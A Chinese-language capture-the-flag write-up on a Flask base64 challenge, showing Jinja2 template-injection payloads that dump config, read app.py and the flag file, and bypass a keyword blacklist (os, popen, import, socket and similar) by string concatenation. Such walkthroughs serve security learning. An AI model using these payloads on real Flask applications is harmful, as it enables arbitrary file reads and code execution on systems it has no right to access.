![](<./img/Pasted image 20221221165258.png>)

---
首页长这样

![](<./img/Pasted image 20221221165318.png>)


```
/decode
```

![](<./img/Pasted image 20221221165420.png>)

```
/hint
```

![](<./img/Pasted image 20221221165508.png>)

---
先是扫目录，无果

编码页面无计可施，尝试在解码页面制造错误

尝试对`123`进行解码

跳转到了`Werkzeug`的调试页面

![](<./img/Pasted image 20221221165800.png>)

获取到了部分源码

大体上是`flask`的`SSTI`

![](<./img/Pasted image 20221221170818.png>)

![](<./img/Pasted image 20221221171012.png>)

```python
{{config}}
```
> 结果 ： &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: True, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;s_e_c_r_e_t_k_e_y&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days=31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(seconds=43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;BOOTSTRAP_USE_MINIFIED&#39;: True, &#39;BOOTSTRAP_CDN_FORCE_SSL&#39;: False, &#39;BOOTSTRAP_QUERYSTRING_REVVING&#39;: True, &#39;BOOTSTRAP_SERVE_LOCAL&#39;: False, &#39;BOOTSTRAP_LOCAL_SUBDOMAIN&#39;: None}&gt;

emmm，`secret_key`看着没什么用，似乎没有什么有价值的信息

---
`url_for`可以使用，直接套出源码先
```python
{{url_for.__globals__['__builtins__']['open']('app.py','r').read()}}
```
> 结果 ： from flask import Flask,render_template_string from flask import render_template,request,flash,redirect,url_for from flask_wtf import FlaskForm from wtforms import StringField, SubmitField from wtforms.validators import DataRequired from flask_bootstrap import Bootstrap import base64 app = Flask(\_\_name\_\_) app.config\[&#39;SECRET_KEY&#39;\] = &#39;s_e_c_r_e_t_k_e_y&#39; bootstrap = Bootstrap(app) class NameForm(FlaskForm): text = StringField(&#39;BASE64加密&#39;,validators= \[DataRequired()\]) submit = SubmitField(&#39;提交&#39;) class NameForm1(FlaskForm): text = StringField(&#39;BASE64解密&#39;,validators= \[DataRequired()\]) submit = SubmitField(&#39;提交&#39;) def waf(str): black_list = \[&#34;flag&#34;,&#34;os&#34;,&#34;system&#34;,&#34;popen&#34;,&#34;import&#34;,&#34;eval&#34;,&#34;chr&#34;,&#34;request&#34;, &#34;subprocess&#34;,&#34;commands&#34;,&#34;socket&#34;,&#34;hex&#34;,&#34;base64&#34;,&#34;\*&#34;,&#34;?&#34;\] for x in black_list : if x in str.lower() : return 1 @app.route(&#39;/hint&#39;,methods=\[&#39;GET&#39;\]) def hint(): txt = &#34;失败乃成功之母！！&#34; return render_template(&#34;hint.html&#34;,txt = txt) @app.route(&#39;/&#39;,methods=\[&#39;POST&#39;,&#39;GET&#39;\]) def encode(): if request.values.get(&#39;text&#39;) : text = request.values.get(&#34;text&#34;) text_decode = base64.b64encode(text.encode()) tmp = &#34;结果 :{0}&#34;.format(str(text_decode.decode())) res = render_template_string(tmp) flash(tmp) return redirect(url_for(&#39;encode&#39;)) else : text = &#34;&#34; form = NameForm(text) return render_template(&#34;index.html&#34;,form = form ,method = &#34;加密&#34; ,img = &#34;flask.png&#34;) @app.route(&#39;/decode&#39;,methods=\[&#39;POST&#39;,&#39;GET&#39;\]) def decode(): if request.values.get(&#39;text&#39;) : text = request.values.get(&#34;text&#34;) text_decode = base64.b64decode(text.encode()) tmp = &#34;结果 ： {0}&#34;.format(text_decode.decode()) if waf(tmp) : flash(&#34;no no no !!&#34;) return redirect(url_for(&#39;decode&#39;)) res = render_template_string(tmp) flash( res ) return redirect(url_for(&#39;decode&#39;)) else : text = &#34;&#34; form = NameForm1(text) return render_template(&#34;index.html&#34;,form = form, method = &#34;解密&#34; , img = &#34;flask1.png&#34;) @app.route(&#39;/&lt;name&gt;&#39;,methods=\[&#39;GET&#39;\]) def not_found(name): return render_template(&#34;404.html&#34;,name = name) if \_\_name\_\_ == &#39;\_\_main\_\_&#39;: app.run(host=&#34;0.0.0.0&#34;, port=5000, debug=True)

```python
def waf(str):
	black_list = ["flag","os","system","popen","import","eval","chr","request", "subprocess","commands","socket","hex","base64","*","?"]
	for x in black_list:
		if x in str.lower():
			return 1
```

`waf`是直接的字符串匹配

直接拼接绕过

```python
{{url_for.__globals__['__builtins__']['__im'+'port__']('o'+'s').listdir('/')}}
```
>[&#39;bin&#39;, &#39;boot&#39;, &#39;dev&#39;, &#39;etc&#39;, &#39;home&#39;, &#39;lib&#39;, &#39;lib64&#39;, &#39;media&#39;, &#39;mnt&#39;, &#39;opt&#39;, &#39;proc&#39;, &#39;root&#39;, &#39;run&#39;, &#39;sbin&#39;, &#39;srv&#39;, &#39;sys&#39;, &#39;tmp&#39;, &#39;usr&#39;, &#39;var&#39;, &#39;this_is_the_flag.txt&#39;, &#39;.dockerenv&#39;, &#39;app&#39;\]

```python
{{url_for.__globals__['__builtins__']['open']('/this_is_the_fl'+'ag.txt','r').read()}}
```

![](<./img/Pasted image 20221221194819.png>)

#Web #python #flask #SSTI #function #代码审计 